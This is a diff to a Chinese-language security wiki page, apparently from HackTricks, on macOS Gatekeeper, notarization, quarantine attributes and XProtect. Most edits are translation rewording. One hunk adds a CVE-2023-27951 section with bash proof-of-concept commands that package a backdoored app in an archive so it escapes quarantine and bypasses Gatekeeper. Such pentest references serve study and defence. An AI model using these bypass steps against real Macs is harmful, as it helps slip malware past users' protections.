@@ -5,7 +5,7 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧**
@@ -29,12 +29,12 @@ Gatekeeper的关键机制在于其**验证**过程。它检查下载的软件是
 以下是其工作原理：
 
 1. **签署应用程序：**当开发者准备分发他们的应用程序时，他们使用一个私钥对应用程序进行**签名**。这个私钥与开发者在加入Apple开发者计划时获得的**证书相关联**。签名过程涉及对应用程序的所有部分创建一个加密哈希，并使用开发者的私钥对该哈希进行加密。
-2. **分发应用程序：**签名的应用程序随附开发者的证书一起分发给用户，该证书包含相应的公钥。
+2. **分发应用程序：**签名的应用程序随后与开发者的证书一起分发给用户，该证书包含相应的公钥。
 3. **验证应用程序：**当用户下载并尝试运行应用程序时，他们的Mac操作系统使用开发者证书中的公钥解密哈希。然后，它根据应用程序的当前状态重新计算哈希，并将其与解密的哈希进行比较。如果它们匹配，这意味着**应用程序自开发者签名以来没有被修改**，系统允许应用程序运行。
 
 应用程序签名是Apple的Gatekeeper技术的重要组成部分。当用户尝试**打开从互联网下载的应用程序**时，Gatekeeper会验证应用程序的签名。如果它使用由Apple颁发给已知开发者的证书进行签名，并且代码没有被篡改，Gatekeeper允许应用程序运行。否则，它会阻止应用程序并向用户发出警报。
 
-从macOS Catalina开始，Gatekeeper还会检查应用程序是否经过了Apple的**公证**，增加了额外的安全层。公证过程会检查应用程序是否存在已知的安全问题和恶意代码，如果这些检查通过，Apple会向应用程序添加一个Gatekeeper可以验证的凭证。
+从macOS Catalina开始，**Gatekeeper还会检查应用程序是否经过了Apple的公证**，增加了额外的安全层。公证过程会检查应用程序是否存在已知的安全问题和恶意代码，如果这些检查通过，Apple会向应用程序添加一个Gatekeeper可以验证的凭证。
 
 #### 检查签名
 
@@ -59,9 +59,9 @@ codesign -s <cert-name-keychain> toolsdemo
 
 苹果的验签过程是一种额外的保护措施，用于保护用户免受潜在有害软件的侵害。它涉及开发者将他们的应用程序提交给苹果的验签服务进行审查，这与应用审核不应混淆。该服务是一个自动化系统，会对提交的软件进行检查，以查找恶意内容和代码签名可能存在的问题。
 
-如果软件在没有引起任何关注的情况下通过了这个检查，验签服务会生成一个验签凭证。然后，开发者需要将这个凭证附加到他们的软件上，这个过程被称为“stapling”。此外，验签凭证也会在网上发布，Gatekeeper（苹果的安全技术）可以访问它。
+如果软件在没有引起任何关注的情况下通过了这个检查，验签服务会生成一个验签票据。然后，开发者需要将这个票据附加到他们的软件上，这个过程被称为“stapling”。此外，验签票据也会在网上发布，Gatekeeper（苹果的安全技术）可以访问它。
 
-当用户首次安装或执行软件时，验签凭证的存在（无论是附加到可执行文件上还是在线找到）会通知Gatekeeper该软件已由苹果进行了验签。因此，Gatekeeper会在初始启动对话框中显示一个描述性消息，指示该软件已经通过苹果的恶意内容检查。这个过程增强了用户对他们在系统上安装或运行的软件的安全信心。
+当用户首次安装或执行软件时，验签票据的存在（无论是附在可执行文件上还是在线找到）会通知Gatekeeper该软件已由苹果进行了验签。因此，Gatekeeper会在初始启动对话框中显示一个描述性消息，指示该软件已经通过苹果的恶意内容检查。这个过程增强了用户对他们在系统上安装或运行的软件的安全信心。
 
 ### 枚举GateKeeper
 
@@ -107,7 +107,7 @@ cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
 cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
 cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
 ```
-这些哈希值来自于 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** 和 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**。
+这些哈希值来自于 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`**, **`/var/db/gke.bundle/Contents/Resources/gk.db`** 和 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**。
 
 **`spctl`** 的选项 **`--master-disable`** 和 **`--global-disable`** 将完全**禁用**这些签名检查：
 ```bash
@@ -148,10 +148,10 @@ spctl --assess -v /Applications/App.app
 
 当用户尝试执行文件时，**检疫标志的存在会触发 macOS 的 Gatekeeper 安全功能**。
 
-在没有检疫标志的情况下（例如通过某些 BitTorrent 客户端下载的文件），Gatekeeper 的检查可能不会执行。因此，用户在打开从不安全或未知来源下载的文件时应谨慎。
+在没有检疫标志的情况下（例如通过某些 BitTorrent 客户端下载的文件），Gatekeeper 的检查可能不会执行。因此，用户在打开从不太安全或未知来源下载的文件时应谨慎。
 
 {% hint style="info" %}
-**验证**代码签名的有效性是一个**资源密集型**的过程，其中包括生成代码及其所有捆绑资源的加密哈希。此外，检查证书的有效性还涉及在线检查苹果服务器，以查看其是否在签发后被吊销。出于这些原因，每次启动应用程序时运行完整的代码签名和公证检查是**不切实际的**。
+**验证**代码签名的有效性是一个**资源密集型**的过程，其中包括生成代码及其所有捆绑资源的加密哈希。此外，检查证书的有效性还涉及在线检查苹果的服务器，以查看其是否在发放后被吊销。出于这些原因，每次启动应用程序时运行完整的代码签名和公证检查是**不切实际的**。
 
 因此，这些检查仅在执行带有检疫属性的应用程序时运行。
 {% endhint %}
@@ -230,13 +230,13 @@ XProtect位于SIP保护的位置**/Library/Apple/System/Library/CoreServices/XPr
 * **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**：允许具有这些cdhashes的代码使用旧版授权。
 * **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**：禁止通过BundleID和TeamID加载的插件和扩展列表，或指示最低版本。
 * **`XProtect.bundle/Contents/Resources/XProtect.yara`**：用于检测恶意软件的Yara规则。
-* **`XProtect.bundle/Contents/Resources/gk.db`**：包含被阻止的应用程序和TeamID的哈希的SQLite3数据库。
+* **`XProtect.bundle/Contents/Resources/gk.db`**：带有被阻止的应用程序和TeamID的哈希的SQLite3数据库。
 
 请注意，还有一个与XProtect相关的应用程序**`/Library/Apple/System/Library/CoreServices/XProtect.app`**与Gatekeeper进程无关。
 
 ## Gatekeeper绕过
 
-任何绕过Gatekeeper的方式（成功让用户下载并在Gatekeeper应该禁止的情况下执行）都被视为macOS中的漏洞。以下是一些过去允许绕过Gatekeeper的技术所分配的CVE：
+任何绕过Gatekeeper的方式（成功使用户下载并在Gatekeeper应该禁止的情况下执行）都被视为macOS中的漏洞。以下是一些过去允许绕过Gatekeeper的技术所分配的CVE：
 
 ### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)
 
@@ -264,7 +264,7 @@ zip -r test.app/Contents test.zip
 
 ### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)
 
-即使组件不同，利用此漏洞的方式与之前的漏洞非常相似。在这种情况下，我们将从**`application.app/Contents`**生成一个Apple Archive，因此**`application.app`在被**Archive Utility**解压缩时不会获得隔离属性**。
+即使组件不同，利用此漏洞的方法与之前的漏洞非常相似。在这种情况下，我们将从**`application.app/Contents`**生成一个Apple Archive，因此**`application.app`在被**Archive Utility**解压缩时不会获得隔离属性**。
 ```bash
 aa archive -d test.app/Contents -o test.app.aar
 ```
@@ -292,16 +292,48 @@ python3 -m http.server
 
 ### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
 
-发现**Google Chrome未设置下载文件的隔离属性**，因为存在一些macOS内部问题。
+发现**Google Chrome未设置下载文件的隔离属性**，这是由于一些macOS内部问题引起的。
 
+### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
+
+AppleDouble文件格式将文件的属性存储在以`._`开头的单独文件中，这有助于在macOS设备之间复制文件属性。然而，注意到在解压AppleDouble文件后，以`._`开头的文件**未被赋予隔离属性**。
+
+{% code overflow="wrap" %}
+```bash
+mkdir test
+echo a > test/a
+echo b > test/b
+echo ._a > test/._a
+aa archive -d test/ -o test.aar
+
+# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
+```
+{% endcode %}
+
+能够创建一个没有设置隔离属性的文件，这样就有可能绕过Gatekeeper。诀窍是使用AppleDouble命名约定（以`._`开头）创建一个DMG文件应用程序，并创建一个可见文件作为对这个没有隔离属性的隐藏文件的符号链接。当执行dmg文件时，由于它没有隔离属性，它将绕过Gatekeeper。
+```bash
+# Create an app bundle with the backdoor an call it app.app
+
+echo "[+] creating disk image with app"
+hdiutil create -srcfolder app.app app.dmg
+
+echo "[+] creating directory and files"
+mkdir
+mkdir -p s/app
+cp app.dmg s/app/._app.dmg
+ln -s ._app.dmg s/app/app.dmg
+
+echo "[+] compressing files"
+aa archive -d s/ -o app.aar
+```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获取 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
 
 </details>
